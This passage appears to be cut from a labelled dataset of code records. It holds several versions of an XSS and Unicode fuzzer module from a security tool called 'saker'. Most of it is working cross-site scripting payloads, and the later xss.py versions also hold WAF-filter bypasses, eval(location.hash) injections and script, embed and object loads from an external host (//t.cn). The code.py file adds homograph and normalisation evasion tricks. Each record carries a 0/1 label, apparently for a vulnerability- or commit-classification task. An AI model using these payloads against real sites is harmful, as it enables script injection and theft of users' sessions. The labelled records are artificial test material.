'dialog',\n    'dir',\n    'div',\n    'dl',\n    'dt',\n    'element',\n    'em',\n    'embed',\n    'fieldset',\n    'figcaption',\n    'figure',\n    'font',\n    'footer',\n    'form',\n    'frame',\n    'frameset',\n    'h1',\n    'h2',\n    'h3',\n    'h4',\n    'h5',\n    'h6',\n    'head',\n    'header',\n    'hgroup',\n    'hr',\n    'html',\n    'i',\n    'iframe',\n    'image',\n    'img',\n    'input',\n    'ins',\n    'isindex',\n    'kbd',\n    'keygen',\n    'label',\n    'layer',\n    'legend',\n    'li',\n    'link',\n    'listing',\n    'main',\n    'map',\n    'mark',\n    'marquee',\n    'menu',\n    'menuitem',\n    'meta',\n    'meter',\n    'multicol',\n    'nav',\n    'nobr',\n    'noembed',\n    'noframes',\n    'nolayer',\n    'noscript',\n    'object',\n    'ol',\n    'optgroup',\n    'option',\n    'output',\n    'p',\n    'param',\n    'picture',\n    # 'plaintext',\n    'pre',\n    'progress',\n    'q',\n    'rp',\n    'rt',\n    'rtc',\n    'ruby',\n    's',\n    'samp',\n    'script',\n    'section',\n    'select',\n    'shadow',\n    'small',\n    'source',\n    'spacer',\n    'span',\n    'strike',\n    'strong',\n    'style',\n    'sub',\n    'summary',\n    'sup',\n    'table',\n    'tbody',\n    'td',\n    'template',\n    'textarea',\n    'tfoot',\n    'th',\n    'thead',\n    'time',\n    'title',\n    'tr',\n    'track',\n    'tt',\n    'u',\n    'ul',\n    'var',\n    'video',\n    'wbr',\n    'xmp',\n]\n\n_events = [\n    'onabort',\n    'onautocomplete',\n    'onautocompleteerror',\n    'onafterscriptexecute',\n    'onanimationend',\n    'onanimationiteration',\n    'onanimationstart',\n    'onbeforecopy',\n    'onbeforecut',\n    'onbeforeload',\n    'onbeforepaste',\n    'onbeforescriptexecute',\n    'onbeforeunload',\n    'onbegin',\n    'onblur',\n    'oncanplay',\n    'oncanplaythrough',\n    'onchange',\n    'onclick',\n    'oncontextmenu',\n    'oncopy',\n    'oncut',\n    'ondblclick',\n    'ondrag',\n    'ondragend',\n    'ondragenter',\n    'ondragleave',\n    'ondragover',\n    'ondragstart',\n    'ondrop',\n    'ondurationchange',\n    'onend',\n    'onemptied',\n    'onended',\n    'onerror',\n    'onfocus',\n    'onfocusin',\n    'onfocusout',\n    'onhashchange',\n    'oninput',\n    'oninvalid',\n    'onkeydown',\n    'onkeypress',\n    'onkeyup',\n    'onload',\n    'onloadeddata',\n    'onloadedmetadata',\n    'onloadstart',\n    'onmessage',\n    'onmousedown',\n    'onmouseenter',\n    'onmouseleave',\n    'onmousemove',\n    'onmouseout',\n    'onmouseover',\n    'onmouseup',\n    'onmousewheel',\n    'onoffline',\n    'ononline',\n    'onorientationchange',\n    'onpagehide',\n    'onpageshow',\n    'onpaste',\n    'onpause',\n    'onplay',\n    'onplaying',\n    'onpopstate',\n    'onprogress',\n    'onratechange',\n    'onreset',\n    'onresize',\n    'onscroll',\n    'onsearch',\n    'onseeked',\n    'onseeking',\n    'onselect',\n    'onselectionchange',\n    'onselectstart',\n    'onstalled',\n    'onstorage',\n    'onsubmit',\n    'onsuspend',\n    'ontimeupdate',\n    'ontoggle',\n    'ontouchcancel',\n    'ontouchend',\n    'ontouchmove',\n    'ontouchstart',\n    'ontransitionend',\n    'onunload',\n    'onvolumechange',\n    'onwaiting',\n    'onwebkitanimationend',\n    'onwebkitanimationiteration',\n    'onwebkitanimationstart',\n    'onwebkitfullscreenchange',\n    'onwebkitfullscreenerror',\n    'onwebkitkeyadded',\n    'onwebkitkeyerror',\n    'onwebkitkeymessage',\n    'onwebkitneedkey',\n    'onwebkitsourceclose',\n    'onwebkitsourceended',\n    'onwebkitsourceopen',\n    'onwebkitspeechchange',\n    'onwebkittransitionend',\n    'onwheel'\n]\n\n_htmlTemplate = '''\n<!DOCTYPE html>\n<html>\n<head>\n    <title>XSS Fuzzer</title>\n    <meta http-equiv=\"Content-Type\" content=\"text/html; charset=utf-8\" />\n</head>\n<body>\n%s\n</body>\n</html>\n'''\n\n\nclass XSS(Fuzzer):\n\n    \"\"\"generate XSS payload\"\"\"\n\n    tags = _tags\n    events = _events\n    htmlTemplate = _htmlTemplate\n\n    def __init__(self, url=\"\"):\n        \"\"\"\n        url: xss payload url\n        \"\"\"\n        super(XSS, self).__init__()\n        self.url = url\n\n    @classmethod\n    def alterTest(cls, p=False):\n        return \"<script>alert(/xss/)</script>\"\n\n    @classmethod\n    def genTestHTML(cls):\n        s = ''\n        for t in cls.tags:\n            s += '<%s src=\"x\"' % t\n            for e in cls.events:\n                s += ''' %s=\"console.log('%s %s')\" ''' % (e, t, e)\n            s += '>%s</%s>\\n' % (t, t)\n        return cls.htmlTemplate % s\n\n    def img(self, payload):\n        return '<img/onerror=\"%s\"/src=x>' % payload\n\n    def svg(self, payload):\n        return '<svg/onload=\"%s\"/>' % payload\n\n    def style(self, payload):\n        return '<style/onload=\"%s\"></style>' % payload\n\n    def input(self, payload):\n        return '<input/onfocus=\"%s\"/autofocus>' % payload\n\n    def marquee(self, payload):\n        return '<marquee/onstart=\"%s\"></marquee>' % payload\n\n    def div(self, payload):\n        return '<div/onwheel=\"%s\"/style=\"height:200%;width:100%\"></div>' % payload\n\n    def script(self):\n        payload = \"<script src='%s'></script>\" % self.url\n        return payload\n\n    def event(self, element, src, event, js):\n        payload = \"<%s src=\" % element\n        payload += '\"%s\" ' % src\n        payload += event\n        payload += \"=%s >\" % js\n        return payload\n\n    def cspBypass(self):\n        return \"<link rel='preload' href='%s'>\" % self.url\n/n/n/n", "label": 0}, {"id": "47abf048e510b5be0118d7fc390d0f0202040bca", "code": "/saker/fuzzers/xss.py/n/n#!/usr/bin/env python\n# -*- coding: utf-8 -*-\n\nfrom saker.fuzzers.fuzzer import Fuzzer\n\n\nclass XSS(Fuzzer):\n\n    \"\"\"generate XSS payload\"\"\"\n\n    def __init__(self, url=\"\"):\n        \"\"\"\n        url: xss payload url\n        \"\"\"\n        super(XSS, self).__init__()\n        self.url = url\n\n    @staticmethod\n    def alterTest(self, p=False):\n        return \"<script>alert(/xss/)</script>\"\n\n    def img(self):\n        return '<img/onerror=\"%s\"/src=x>' % payload\n\n    def svg(self, payload):\n        return '<svg/onload=\"%s\"/>' % payload\n\n    def style(self, payload):\n        return '<style/onload=\"%s\"></style>' % payload\n\n    def input(self, payload):\n        return '<input/onfocus=\"%s\"/autofocus>' % payload\n\n    def marquee(self, payload):\n        return '<marquee/onstart=\"%s\"></marquee>' % payload\n\n    def div(self, payload):\n        return '<div/onwheel=\"%s\"/style=\"height:200%;width:100%\"></div>' % payload\n\n    def script(self):\n        payload = \"<script src='%s'></script>\" % self.url\n        return payload\n\n    def event(self, element, src, event, js):\n        payload = \"<%s src=\" % element\n        payload += '\"%s\" ' % src\n        payload += event\n        payload += \"=%s >\" % js\n        return payload\n\n    def cspBypass(self):\n        return \"<link rel='preload' href='%s'>\" % self.url\n/n/n/n", "label": 1}, {"id": "41edd3db5be87f860c0c37199de9b55596b704da", "code": "saker/fuzzers/code.py/n/n#!/usr/bin/env python\n# -*- coding: utf-8 -*-\n\nimport random\nimport string\nfrom urllib.parse import quote\nfrom unicodedata import normalize\nfrom saker.fuzzers.fuzzer import Fuzzer\n\n\nclass Code(Fuzzer):\n\n    \"\"\"Code Payload\"\"\"\n\n    homograph = {\n        'a': '\\u0430',\n        'c': '\\u03F2',\n        'd': '\\u0501',\n        'e': '\\u0435',\n        'h': '\\u04BB',\n        'i': '\\u0456',\n        'j': '\\u0458',\n        'l': '\\u04CF',\n        'o': '\\u043E',\n        'p': '\\u0440',\n        'r': '\\u0433',\n        'q': '\\u051B',\n        's': '\\u0455',\n        'w': '\\u051D',\n        'x': '\\u0445',\n        'y': '\\u0443',\n    }\n\n    def __init__(self):\n        super(Code, self).__init__()\n\n    @staticmethod\n    def fuzzAscii():\n        for i in xrange(256):\n            yield chr(i)\n\n    @staticmethod\n    def fuzzUnicode(cnt=1):\n        for i in xrange(cnt):\n            yield unichr(random.randint(0, 0xffff))\n\n    @staticmethod\n    def fuzzUnicodeReplace(s, cnt=1):\n        # Greek letter\n        s = s.replace(\"A\", \"\u0100\", cnt)\n        s = s.replace(\"A\", \"\u0102\", cnt)\n        s = s.replace(\"A\", \"\u0104\", cnt)\n        s = s.replace(\"a\", \"\u03b1\", cnt)\n        # Russian letter 1-4\n        s = s.replace(\"e\", \"\u0435\", cnt)\n        s = s.replace(\"a\", \"\u0430\", cnt)\n        s = s.replace(\"e\", \"\u0451\", cnt)\n        s = s.replace(\"o\", \"\u043e\", cnt)\n        return s\n\n    @staticmethod\n    def fuzzErrorUnicode(s):\n        # https://www.leavesongs.com/PENETRATION/mysql-charset-trick.html\n        return s + chr(random.randint(0xC2, 0xef))\n\n    @staticmethod\n    def urlencode(s, force=False):\n        if not force:\n            s = quote(s)\n        else:\n            s = map(lambda i: hex(ord(i)).replace(\"0x\", \"%\"), s)\n            s = \"\".join(s)\n        return s\n\n    @staticmethod\n    def findUpper(dst):\n        return list(filter(lambda i: i.upper() == dst, map(chr, range(1, 0x10000))))\n\n    @staticmethod\n    def findLower(dst):\n        return list(filter(lambda i: i.lower() == dst, map(chr, range(1, 0x10000))))\n\n    @staticmethod\n    def findNormalize(dst, form='NFKC'):\n        # form should in ['NFC', 'NFKC', 'NFD', 'NFKD']\n        return list(filter(lambda i: normalize(form, i)[0] == dst, map(chr, range(1, 0x10000))))\n/n/n/nsaker/fuzzers/xss.py/n/n#!/usr/bin/env python\n# -*- coding: utf-8 -*-\n\nfrom saker.fuzzers.fuzzer import Fuzzer\n\n_tags = [\n    'a',\n    'abbr',\n    'acronym',\n    'address',\n    'applet',\n    'area',\n    'article',\n    'aside',\n    'audio',\n    'b',\n    'base',\n    'basefont',\n    'bdi',\n    'bdo',\n    'bgsound',\n    'big',\n    'blink',\n    'blockquote',\n    'body',\n    'br',\n    'button',\n    'canvas',\n    'caption',\n    'center',\n    'cite',\n    'code',\n    'col',\n    'colgroup',\n    'command',\n    'content',\n    'data',\n    'datalist',\n    'dd',\n    'del',\n    'details',\n    'dfn',\n    'dialog',\n    'dir',\n    'div',\n    'dl',\n    'dt',\n    'element',\n    'em',\n    'embed',\n    'fieldset',\n    'figcaption',\n    'figure',\n    'font',\n    'footer',\n    'form',\n    'frame',\n    'frameset',\n    'h1',\n    'h2',\n    'h3',\n    'h4',\n    'h5',\n    'h6',\n    'head',\n    'header',\n    'hgroup',\n    'hr',\n    'html',\n    'i',\n    'iframe',\n    'image',\n    'img',\n    'input',\n    'ins',\n    'isindex',\n    'kbd',\n    'keygen',\n    'label',\n    'layer',\n    'legend',\n    'li',\n    'link',\n    'listing',\n    'main',\n    'map',\n    'mark',\n    'marquee',\n    'menu',\n    'menuitem',\n    'meta',\n    'meter',\n    'multicol',\n    'nav',\n    'nobr',\n    'noembed',\n    'noframes',\n    'nolayer',\n    'noscript',\n    'object',\n    'ol',\n    'optgroup',\n    'option',\n    'output',\n    'p',\n    'param',\n    'picture',\n    # 'plaintext',\n    'pre',\n    'progress',\n    'q',\n    'rp',\n    'rt',\n    'rtc',\n    'ruby',\n    's',\n    'samp',\n    'script',\n    'section',\n    'select',\n    'shadow',\n    'small',\n    'source',\n    'spacer',\n    'span',\n    'strike',\n    'strong',\n    'style',\n    'sub',\n    'summary',\n    'sup',\n    'table',\n    'tbody',\n    'td',\n    'template',\n    'textarea',\n    'tfoot',\n    'th',\n    'thead',\n    'time',\n    'title',\n    'tr',\n    'track',\n    'tt',\n    'u',\n    'ul',\n    'var',\n    'video',\n    'wbr',\n    'xmp',\n]\n\n_events = [\n    'onabort',\n    'onautocomplete',\n    'onautocompleteerror',\n    'onafterscriptexecute',\n    'onanimationend',\n    'onanimationiteration',\n    'onanimationstart',\n    'onbeforecopy',\n    'onbeforecut',\n    'onbeforeload',\n    'onbeforepaste',\n    'onbeforescriptexecute',\n    'onbeforeunload',\n    'onbegin',\n    'onblur',\n    'oncanplay',\n    'oncanplaythrough',\n    'onchange',\n    'onclick',\n    'oncontextmenu',\n    'oncopy',\n    'oncut',\n    'ondblclick',\n    'ondrag',\n    'ondragend',\n    'ondragenter',\n    'ondragleave',\n    'ondragover',\n    'ondragstart',\n    'ondrop',\n    'ondurationchange',\n    'onend',\n    'onemptied',\n    'onended',\n    'onerror',\n    'onfocus',\n    'onfocusin',\n    'onfocusout',\n    'onhashchange',\n    'oninput',\n    'oninvalid',\n    'onkeydown',\n    'onkeypress',\n    'onkeyup',\n    'onload',\n    'onloadeddata',\n    'onloadedmetadata',\n    'onloadstart',\n    'onmessage',\n    'onmousedown',\n    'onmouseenter',\n    'onmouseleave',\n    'onmousemove',\n    'onmouseout',\n    'onmouseover',\n    'onmouseup',\n    'onmousewheel',\n    'onoffline',\n    'ononline',\n    'onorientationchange',\n    'onpagehide',\n    'onpageshow',\n    'onpaste',\n    'onpause',\n    'onplay',\n    'onplaying',\n    'onpopstate',\n    'onprogress',\n    'onratechange',\n    'onreset',\n    'onresize',\n    'onscroll',\n    'onsearch',\n    'onseeked',\n    'onseeking',\n    'onselect',\n    'onselectionchange',\n    'onselectstart',\n    'onstalled',\n    'onstorage',\n    'onsubmit',\n    'onsuspend',\n    'ontimeupdate',\n    'ontoggle',\n    'ontouchcancel',\n    'ontouchend',\n    'ontouchmove',\n    'ontouchstart',\n    'ontransitionend',\n    'onunload',\n    'onvolumechange',\n    'onwaiting',\n    'onwebkitanimationend',\n    'onwebkitanimationiteration',\n    'onwebkitanimationstart',\n    'onwebkitfullscreenchange',\n    'onwebkitfullscreenerror',\n    'onwebkitkeyadded',\n    'onwebkitkeyerror',\n    'onwebkitkeymessage',\n    'onwebkitneedkey',\n    'onwebkitsourceclose',\n    'onwebkitsourceended',\n    'onwebkitsourceopen',\n    'onwebkitspeechchange',\n    'onwebkittransitionend',\n    'onwheel'\n]\n\n_htmlTemplate = '''\n<!DOCTYPE html>\n<html>\n<head>\n    <title>XSS Fuzzer</title>\n    <meta http-equiv=\"Content-Type\" content=\"text/html; charset=utf-8\" />\n</head>\n<body>\n%s\n</body>\n</html>\n'''\n\n# probe for test xss vuln\n_probes = [\n    \"\"\"'';!--\"<XSS>=&{()}\"\"\",\n]\n\n# xss payloads\n_payloads = [\n    '<q/oncut=open()>',\n    '<svg/onload=eval(name)>',\n    '<img src=x onerror=alert(/xss/)>',\n    \"\"\"<img src=\"javascript:alert('xss');\">\"\"\",\n    \"\"\"<style>@im\\\\port'\\\\ja\\\\vasc\\\\ript:alert(\"xss\")';</style>\"\"\",\n    \"\"\"<img style=\"xss:expr/*xss*/ession(alert('xss'))\"> \"\"\",\n    \"\"\"<meta http-equiv=\"refresh\" content=\"0;url=javascript:alert('xss');\">\"\"\",\n    \"\"\"<meta http-equiv=\"refresh\" content=\"0;url=data:text/html base64,PHNjcmlwdD5hbGVydCgnWFNTJyk8L3NjcmlwdD4K\">\"\"\",\n    \"\"\"<head><meta http-equiv=\"content-type\" content=\"text/html; charset=utf-7\"> </head>+ADw-SCRIPT+AD4-alert('XSS');+ADw-/SCRIPT+AD4-\"\"\",\n]\n\n# payload for waf test\n_waf_payloads = [\n    \"<IMG SRC=JaVaScRiPt:alert('xss')>\",\n    '<<script>alert(\"xss\");//<</script>',\n    \"\"\"<img src=\"javascript:alert('xss')\" \"\"\",\n    '<a href=\"javascript%26colon;alert(1)\">click',\n    '<a href=javas&#99;ript:alert(1)>click',\n    '<--`<img/src=` onerror=confirm``> --!>',\n    '\\'\"</Script><Html Onmouseover=(confirm)()//'\n    '<imG/sRc=l oNerrOr=(prompt)() x>',\n    '<!--<iMg sRc=--><img src=x oNERror=(prompt)`` x>',\n    '<deTails open oNToggle=confi\\u0072m()>',\n    '<img sRc=l oNerrOr=(confirm)() x>',\n    '<svg/x=\">\"/onload=confirm()//',\n    '<svg%0Aonload=%09((pro\\u006dpt))()//',\n    '<iMg sRc=x:confirm`` oNlOad=e\\u0076al(src)>',\n    '<sCript x>confirm``</scRipt x>',\n    '<Script x>prompt()</scRiPt x>',\n    '<sCriPt sRc=//t.cn>',\n    '<embed//sRc=//t.cn>',\n    '<base href=//t.cn/><script src=/>',\n    '<object//data=//t.cn>',\n    '<s=\" onclick=confirm``>clickme',\n    '<svG oNLoad=co\\u006efirm&#x28;1&#x29>',\n    '\\'\"><y///oNMousEDown=((confirm))()>Click',\n    '<a/href=javascript&colon;co\\u006efirm&#40;&quot;1&quot;&#41;>clickme</a>',\n    '<img src=x onerror=confir\\u006d`1`>',\n    '<svg/onload=co\\u006efir\\u006d`1`>',\n    '<?xml version=\"1.0\"?><html><script xmlns=\"http://www.w3.org/1999/xhtml\">alert(1)</script></html>'\n]\n\n# payload with html 5 features\n# http://html5sec.org\n_h5payloads = [\n    '<form id=\"test\"></form><button form=\"test\" formaction=\"javascript:alert(1)\">X</button>',\n    '<input onfocus=alert(1) autofocus>',\n    '<input onblur=alert(1) autofocus><input autofocus>',\n    '<body onscroll=alert(1)>' + '<br>' * 100 + '<input autofocus>',\n    '<video><source onerror=\"alert(1)\">',\n    '<video onerror=\"alert(1)\"><source></source></video>',\n    '<form><button formaction=\"javascript:alert(1)\">X</button>',\n    '<math href=\"javascript:alert(1)\">CLICKME</math>',\n    '<link rel=\"import\" href=\"test.svg\" />',\n    '<iframe srcdoc=\"&lt;img src&equals;x:x onerror&equals;alert&lpar;1&rpar;&gt;\" />',\n]\n\n\nclass XSS(Fuzzer):\n\n    \"\"\"generate XSS payload\"\"\"\n\n    tags = _tags\n    events = _events\n    htmlTemplate = _htmlTemplate\n    probes = _probes\n    payloads = _payloads\n    waf_payloads = _waf_payloads\n    h5payloads = _h5payloads\n\n    def __init__(self, url=\"\"):\n        \"\"\"\n        url: xss payload url\n        \"\"\"\n        super(XSS, self).__init__()\n        self.url = url\n\n    @classmethod\n    def alterTest(cls, p=False):\n        return \"<script>alert(/xss/)</script>\"\n\n    @classmethod\n    def genTestHTML(cls):\n        s = ''\n        for t in cls.tags:\n            s += '<%s src=\"x\"' % t\n            for e in cls.events:\n                s += ''' %s=\"console.log('%s %s')\" ''' % (e, t, e)\n            s += '>%s</%s>\\n' % (t, t)\n        return cls.htmlTemplate % s\n\n    def img(self, payload):\n        return '<img/onerror=\"%s\"/src=x>' % payload\n\n    def svg(self, payload):\n        return '<svg/onload=\"%s\"/>' % payload\n\n    def style(self, payload):\n        return '<style/onload=\"%s\"></style>' % payload\n\n    def input(self, payload):\n        return '<input/onfocus=\"%s\"/autofocus>' % payload\n\n    def marquee(self, payload):\n        return '<marquee/onstart=\"%s\"></marquee>' % payload\n\n    def div(self, payload):\n        return '<div/onwheel=\"%s\"/style=\"height:200%;width:100%\"></div>' % payload\n\n    def script(self):\n        payload = \"<script src='%s'></script>\" % self.url\n        return payload\n\n    def event(self, element, src, event, js):\n        payload = \"<%s src=\" % element\n        payload += '\"%s\" ' % src\n        payload += event\n        payload += \"=%s >\" % js\n        return payload\n\n    def cspBypass(self):\n        return \"<link rel='preload' href='%s'>\" % self.url\n/n/n/n", "label": 0}, {"id": "41edd3db5be87f860c0c37199de9b55596b704da", "code": "/saker/fuzzers/code.py/n/n#!/usr/bin/env python\n# -*- coding: utf-8 -*-\n\nimport random\nimport string\nfrom urllib import quote\nfrom saker.fuzzers.fuzzer import Fuzzer\n\n\nclass Code(Fuzzer):\n\n    \"\"\"Code Payload\"\"\"\n\n    homograph = {\n        'a': '\\u0430',\n        'c': '\\u03F2',\n        'd': '\\u0501',\n        'e': '\\u0435',\n        'h': '\\u04BB',\n        'i': '\\u0456',\n        'j': '\\u0458',\n        'l': '\\u04CF',\n        'o': '\\u043E',\n        'p': '\\u0440',\n        'r': '\\u0433',\n        'q': '\\u051B',\n        's': '\\u0455',\n        'w': '\\u051D',\n        'x': '\\u0445',\n        'y': '\\u0443',\n    }\n\n    def __init__(self):\n        super(Code, self).__init__()\n\n    @staticmethod\n    def fuzzAscii():\n        for i in xrange(256):\n            yield chr(i)\n\n    @staticmethod\n    def fuzzUnicode(cnt=1):\n        for i in xrange(cnt):\n            yield unichr(random.randint(0, 0xffff))\n\n    @staticmethod\n    def fuzzUnicodeReplace(s, cnt=1):\n        # Greek letter\n        s = s.replace(\"A\", \"\u0100\", cnt)\n        s = s.replace(\"A\", \"\u0102\", cnt)\n        s = s.replace(\"A\", \"\u0104\", cnt)\n        s = s.replace(\"a\", \"\u03b1\", cnt)\n        # Russian letter 1-4\n        s = s.replace(\"e\", \"\u0435\", cnt)\n        s = s.replace(\"a\", \"\u0430\", cnt)\n        s = s.replace(\"e\", \"\u0451\", cnt)\n        s = s.replace(\"o\", \"\u043e\", cnt)\n        return s\n\n    @staticmethod\n    def fuzzErrorUnicode(s):\n        # https://www.leavesongs.com/PENETRATION/mysql-charset-trick.html\n        return s + chr(random.randint(0xC2, 0xef))\n\n    @staticmethod\n    def urlencode(s, force=False):\n        if not force:\n            s = quote(s)\n        else:\n            s = map(lambda i: hex(ord(i)).replace(\"0x\", \"%\"), s)\n            s = \"\".join(s)\n        return s\n/n/n/n", "label": 1}, {"id": "9d984e18d74febb18c47c74a2e0ad9fe6efc0478", "code": "saker/fuzzers/xss.py/n/n#!/usr/bin/env python\n# -*- coding: utf-8 -*-\n\nfrom saker.fuzzers.fuzzer import Fuzzer\n\n_tags = [\n    'a',\n    'abbr',\n    'acronym',\n    'address',\n    'applet',\n    'area',\n    'article',\n    'aside',\n    'audio',\n    'b',\n    'base',\n    'basefont',\n    'bdi',\n    'bdo',\n    'bgsound',\n    'big',\n    'blink',\n    'blockquote',\n    'body',\n    'br',\n    'button',\n    'canvas',\n    'caption',\n    'center',\n    'cite',\n    'code',\n    'col',\n    'colgroup',\n    'command',\n    'content',\n    'data',\n    'datalist',\n    'dd',\n    'del',\n    'details',\n    'dfn',\n    'dialog',\n    'dir',\n    'div',\n    'dl',\n    'dt',\n    'element',\n    'em',\n    'embed',\n    'fieldset',\n    'figcaption',\n    'figure',\n    'font',\n    'footer',\n    'form',\n    'frame',\n    'frameset',\n    'h1',\n    'h2',\n    'h3',\n    'h4',\n    'h5',\n    'h6',\n    'head',\n    'header',\n    'hgroup',\n    'hr',\n    'html',\n    'i',\n    'iframe',\n    'image',\n    'img',\n    'input',\n    'ins',\n    'isindex',\n    'kbd',\n    'keygen',\n    'label',\n    'layer',\n    'legend',\n    'li',\n    'link',\n    'listing',\n    'main',\n    'map',\n    'mark',\n    'marquee',\n    'menu',\n    'menuitem',\n    'meta',\n    'meter',\n    'multicol',\n    'nav',\n    'nobr',\n    'noembed',\n    'noframes',\n    'nolayer',\n    'noscript',\n    'object',\n    'ol',\n    'optgroup',\n    'option',\n    'output',\n    'p',\n    'param',\n    'picture',\n    # 'plaintext',\n    'pre',\n    'progress',\n    'q',\n    'rp',\n    'rt',\n    'rtc',\n    'ruby',\n    's',\n    'samp',\n    'script',\n    'section',\n    'select',\n    'shadow',\n    'small',\n    'source',\n    'spacer',\n    'span',\n    'strike',\n    'strong',\n    'style',\n    'sub',\n    'summary',\n    'sup',\n    'table',\n    'tbody',\n    'td',\n    'template',\n    'textarea',\n    'tfoot',\n    'th',\n    'thead',\n    'time',\n    'title',\n    'tr',\n    'track',\n    'tt',\n    'u',\n    'ul',\n    'var',\n    'video',\n    'wbr',\n    'xmp',\n]\n\n_events = [\n    'onabort',\n    'onautocomplete',\n    'onautocompleteerror',\n    'onafterscriptexecute',\n    'onanimationend',\n    'onanimationiteration',\n    'onanimationstart',\n    'onbeforecopy',\n    'onbeforecut',\n    'onbeforeload',\n    'onbeforepaste',\n    'onbeforescriptexecute',\n    'onbeforeunload',\n    'onbegin',\n    'onblur',\n    'oncanplay',\n    'oncanplaythrough',\n    'onchange',\n    'onclick',\n    'oncontextmenu',\n    'oncopy',\n    'oncut',\n    'ondblclick',\n    'ondrag',\n    'ondragend',\n    'ondragenter',\n    'ondragleave',\n    'ondragover',\n    'ondragstart',\n    'ondrop',\n    'ondurationchange',\n    'onend',\n    'onemptied',\n    'onended',\n    'onerror',\n    'onfocus',\n    'onfocusin',\n    'onfocusout',\n    'onhashchange',\n    'oninput',\n    'oninvalid',\n    'onkeydown',\n    'onkeypress',\n    'onkeyup',\n    'onload',\n    'onloadeddata',\n    'onloadedmetadata',\n    'onloadstart',\n    'onmessage',\n    'onmousedown',\n    'onmouseenter',\n    'onmouseleave',\n    'onmousemove',\n    'onmouseout',\n    'onmouseover',\n    'onmouseup',\n    'onmousewheel',\n    'onoffline',\n    'ononline',\n    'onorientationchange',\n    'onpagehide',\n    'onpageshow',\n    'onpaste',\n    'onpause',\n    'onplay',\n    'onplaying',\n    'onpopstate',\n    'onprogress',\n    'onratechange',\n    'onreset',\n    'onresize',\n    'onscroll',\n    'onsearch',\n    'onseeked',\n    'onseeking',\n    'onselect',\n    'onselectionchange',\n    'onselectstart',\n    'onstalled',\n    'onstorage',\n    'onsubmit',\n    'onsuspend',\n    'ontimeupdate',\n    'ontoggle',\n    'ontouchcancel',\n    'ontouchend',\n    'ontouchmove',\n    'ontouchstart',\n    'ontransitionend',\n    'onunload',\n    'onvolumechange',\n    'onwaiting',\n    'onwebkitanimationend',\n    'onwebkitanimationiteration',\n    'onwebkitanimationstart',\n    'onwebkitfullscreenchange',\n    'onwebkitfullscreenerror',\n    'onwebkitkeyadded',\n    'onwebkitkeyerror',\n    'onwebkitkeymessage',\n    'onwebkitneedkey',\n    'onwebkitsourceclose',\n    'onwebkitsourceended',\n    'onwebkitsourceopen',\n    'onwebkitspeechchange',\n    'onwebkittransitionend',\n    'onwheel'\n]\n\n_htmlTemplate = '''\n<!DOCTYPE html>\n<html>\n<head>\n    <title>XSS Fuzzer</title>\n    <meta http-equiv=\"Content-Type\" content=\"text/html; charset=utf-8\" />\n</head>\n<body>\n%s\n</body>\n</html>\n'''\n\n# probe for test xss vuln\n_probes = [\n    \"\"\"'';!--\"<XSS>=&{()}\"\"\",\n]\n\n# xss payloads\n_payloads = [\n    '<q/oncut=open()>',\n    '<svg/onload=eval(name)>',\n    '<svg/onload=eval(window.name)>',\n    '<svg/onload=eval(location.hash.slice(1))>',\n    '<img src=x onerror=alert(/xss/)>',\n    \"\"\"<img src=\"javascript:alert('xss');\">\"\"\",\n    \"\"\"<style>@im\\\\port'\\\\ja\\\\vasc\\\\ript:alert(\"xss\")';</style>\"\"\",\n    \"\"\"<img style=\"xss:expr/*xss*/ession(alert('xss'))\"> \"\"\",\n    \"\"\"<meta http-equiv=\"refresh\" content=\"0;url=javascript:alert('xss');\">\"\"\",\n    \"\"\"<meta http-equiv=\"refresh\" content=\"0;url=data:text/html base64,PHNjcmlwdD5hbGVydCgnWFNTJyk8L3NjcmlwdD4K\">\"\"\",\n    \"\"\"<head><meta http-equiv=\"content-type\" content=\"text/html; charset=utf-7\"> </head>+ADw-SCRIPT+AD4-alert('XSS');+ADw-/SCRIPT+AD4-\"\"\"\n]\n\n# payload for waf test\n_waf_payloads = [\n    \"<IMG SRC=JaVaScRiPt:alert('xss')>\",\n    '<<script>alert(\"xss\");//<</script>',\n    \"\"\"<img src=\"javascript:alert('xss')\" \"\"\",\n    '<a href=\"javascript%26colon;alert(1)\">click',\n    '<a href=javas&#99;ript:alert(1)>click',\n    '<--`<img/src=` onerror=confirm``> --!>',\n    '\\'\"</Script><Html Onmouseover=(confirm)()//'\n    '<imG/sRc=l oNerrOr=(prompt)() x>',\n    '<!--<iMg sRc=--><img src=x oNERror=(prompt)`` x>',\n    '<deTails open oNToggle=confi\\u0072m()>',\n    '<img sRc=l oNerrOr=(confirm)() x>',\n    '<svg/x=\">\"/onload=confirm()//',\n    '<svg%0Aonload=%09((pro\\u006dpt))()//',\n    '<iMg sRc=x:confirm`` oNlOad=e\\u0076al(src)>',\n    '<sCript x>confirm``</scRipt x>',\n    '<Script x>prompt()</scRiPt x>',\n    '<sCriPt sRc=//t.cn>',\n    '<embed//sRc=//t.cn>',\n    '<base href=//t.cn/><script src=/>',\n    '<object//data=//t.cn>',\n    '<s=\" onclick=confirm``>clickme',\n    '<svG oNLoad=co\\u006efirm&#x28;1&#x29>',\n    '\\'\"><y///oNMousEDown=((confirm))()>Click',\n    '<a/href=javascript&colon;co\\u006efirm&#40;&quot;1&quot;&#41;>clickme</a>',\n    '<img src=x onerror=confir\\u006d`1`>',\n    '<svg/onload=co\\u006efir\\u006d`1`>',\n    '<?xml version=\"1.0\"?><html><script xmlns=\"http://www.w3.org/1999/xhtml\">alert(1)</script></html>',\n    '<scriscriptpt>alert(/xss/)</scriscriptpt>',\n    '\u00bcscript\u00bealert(\u00a2XSS\u00a2)\u00bc/script\u00be'\n]\n\n# payload with html 5 features\n# http://html5sec.org\n_h5payloads = [\n    '<form id=\"test\"></form><button form=\"test\" formaction=\"javascript:alert(1)\">X</button>',\n    '<input onfocus=alert(1) autofocus>',\n    '<input onblur=alert(1) autofocus><input autofocus>',\n    '<body onscroll=alert(1)>' + '<br>' * 100 + '<input autofocus>',\n    '<video><source onerror=\"alert(1)\">',\n    '<video onerror=\"alert(1)\"><source></source></video>',\n    '<form><button formaction=\"javascript:alert(1)\">X</button>',\n    '<math href=\"javascript:alert(1)\">CLICKME</math>',\n    '<link rel=\"import\" href=\"test.svg\" />',\n    '<iframe srcdoc=\"&lt;img src&equals;x:x onerror&equals;alert&lpar;1&rpar;&gt;\" />',\n]\n\n\nclass XSS(Fuzzer):\n\n    \"\"\"generate XSS payload\"\"\"\n\n    tags = _tags\n    events = _events\n    htmlTemplate = _htmlTemplate\n    probes = _probes\n    payloads = _payloads\n    waf_payloads = _waf_payloads\n    h5payloads = _h5payloads\n\n    def __init__(self, url=\"\"):\n        \"\"\"\n        url: xss payload url\n        \"\"\"\n        super(XSS, self).__init__()\n        self.url = url\n\n    @classmethod\n    def alterTest(cls, 